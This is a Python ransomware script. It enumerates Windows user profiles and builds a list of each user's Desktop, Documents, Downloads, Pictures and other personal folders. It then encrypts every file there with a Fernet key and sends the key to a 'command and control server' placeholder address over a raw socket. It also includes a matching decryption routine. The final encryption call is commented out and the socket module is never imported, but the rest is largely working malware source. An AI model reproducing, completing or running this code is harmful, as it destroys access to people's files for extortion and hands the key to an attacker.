#===========================#
# I M P O R T S             #
#===========================#

from cryptography.fernet import Fernet, InvalidToken
import glob
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    BACKGROUND_MAGENTA = '\033[105m'
    BACKGROUND_WHITE = '\033[47m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    ORANGE = '\033[38;5;208m'

os.system("color")

#===========================#

keyfilePath = "key.txt"

#===========================#

def connect_to_server(host='127.0.0.1', port=12345, message="Hello!"):

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    
        try:
    
            # Connect to the server
            client_socket.connect((host, port))
            
            print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Connected to [{bcolors.WARNING}{host}:{port}{bcolors.ENDC}]")
            
            # Send the message
            client_socket.sendall(message.encode('utf-8'))
            
            print(f"|  [{bcolors.OKGREEN}>{bcolors.ENDC}] Sent: [{bcolors.OKCYAN}{message}{bcolors.ENDC}]")
            
            # Close the connection
            client_socket.close()
            
            print(f"| [{bcolors.FAIL}x{bcolors.ENDC}] Connection closed.")

        except Exception as e:
        
            print(f"| [{bcolors.WARNING}x{bcolors.ENDC}] Error: {e}")

#===========================#

# Generates encryption key in file <filename>
def generate_key():

    key = Fernet.generate_key()
    
    # Write the key to a file
    with open(keyfilePath, "wb") as filekey:
        filekey.write(key)
    
    # Exfiltrate the key to the command and control server
    cncIP = "0.0.0.0"
    cncPort = 12345
    connect_to_server(cncIP, cncPort, key)

#===========================#

def read_key():
    with open(keyfilePath, "rb") as filekey:
        return filekey.read()

#===========================#

def read_file(file_path):
    with open(file_path, "rb") as file:
        return file.read()

def write_file(file_path, data):
    with open(file_path, "wb") as file:
        file.write(data)

#===========================#

def decrypt(input_file):
    try:
        key = read_key()
        fernet = Fernet(key)
        data = read_file(input_file)
        decrypted_data = fernet.decrypt(data)
        write_file(input_file, decrypted_data)
        
    except InvalidToken:
        print("Invalid token! Decryption failed.")
    except Exception as e:
        print(f"An error occurred: {e}")

#===========================#

def encrypt(input_file):
    try:
        key = read_key()
        fernet = Fernet(key)
        data = read_file(input_file)
        encrypted_data = fernet.encrypt(data)
        write_file(input_file, encrypted_data)
        
    except Exception as e:
        print(f"An error occurred: {e}")

#===========================#

def walk_files(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            yield file_path

#===========================#

def ransomware(dirsToEncrypt):

    # Generate an encryption key.
    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating encryption key...")
    generate_key()

    for dirToEncrypt in dirsToEncrypt:

        for file_path in walk_files(dirToEncrypt):
        
            # DON'T ENCRYPT THE KEY FILE OR THIS PIECE OF CODE!
            if file_path != keyfilePath and ".ini" not in file_path and ".lnk" not in file_path and ".py" not in file_path and "key.txt" not in file_path:
                encrypt(file_path)
                print(f"-> [{bcolors.FAIL}Encrypted{bcolors.ENDC}] [{bcolors.ORANGE}"+file_path+f"{bcolors.ENDC}]")

#===========================#

def deransomware(dirsToEncrypt):

    for dirToEncrypt in dirsToEncrypt:

        for file_path in walk_files(dirToEncrypt):
        
            # DON'T DECRYPT THE KEY FILE OR THIS PIECE OF CODE!
            if file_path != keyfilePath and ".ini" not in file_path and ".lnk" not in file_path and ".py" not in file_path and "key.txt" not in file_path:
                decrypt(file_path)
                print(f"-> [{bcolors.OKGREEN}Decrypted{bcolors.ENDC}] [{bcolors.OKCYAN}"+file_path+f"{bcolors.ENDC}]")

#===========================#

def enumerate_users():

    users = []
    
    #------------------------------------#

    # Path where user profiles are stored
    user_profiles_path = 'C:/Users/'
    
    #------------------------------------#

    # Get a list of all user directories in the user profiles path
    user_directories = glob.glob(os.path.join(user_profiles_path, '*'))
    
    #------------------------------------#

    for user_dir in user_directories:
    
        documents_folder = os.path.join(user_dir, 'Documents')
        
        # If a documents folder exists, so does the user.
        if os.path.exists(documents_folder):
        
            # Get the user's name from the folder path
            user = str(os.path.basename(user_dir))
            
            # Skip default Windows "users"
            if user != "All Users" and user != "Default" and user != "Default User" and user != "Public":
            
                print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] User found: [{bcolors.OKCYAN}"+user+f"{bcolors.ENDC}]")
                users.append(user_dir)
    
    return users

#===========================#

if __name__ == '__main__':
    
    # Enumerate all users on the machine.
    users = enumerate_users()
    
    #------------------------------------#
    
    # For each user on the machine...
    for user_dir in users:
    
        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] User: [{bcolors.OKCYAN}"+user_dir+f"{bcolors.ENDC}]")
    
        #------------------------------------#
    
        # Generate file paths for this user.
        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating file paths to encrypt...")
        
        contactsFolder = os.path.join(user_dir, 'Contacts')
        desktopFolder = os.path.join(user_dir, 'Desktop')
        documentsFolder = os.path.join(user_dir, 'Documents')
        downloadsFolder = os.path.join(user_dir, 'Downloads')
        favoritesFolder = os.path.join(user_dir, 'Favorites')
        musicFolder = os.path.join(user_dir, 'Music')
        picturesFolder = os.path.join(user_dir, 'Pictures')
        videosFolder = os.path.join(user_dir, 'Videos')
        
        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generated file paths to encrypt:")
        
        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+contactsFolder+f"{bcolors.ENDC}]")
        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+desktopFolder+f"{bcolors.ENDC}]")
        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+documentsFolder+f"{bcolors.ENDC}]")
        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+downloadsFolder+f"{bcolors.ENDC}]")
        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+favoritesFolder+f"{bcolors.ENDC}]")
        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+musicFolder+f"{bcolors.ENDC}]")
        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+picturesFolder+f"{bcolors.ENDC}]")
        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+videosFolder+f"{bcolors.ENDC}]")
        
        commonDirectories = [
            contactsFolder,
            desktopFolder,
            documentsFolder,
            downloadsFolder,
            favoritesFolder,
            musicFolder,
            picturesFolder,
            videosFolder,
        ]
        
        #------------------------------------#
        
        # Encrypt everything!
        # ransomware(commonDirectories)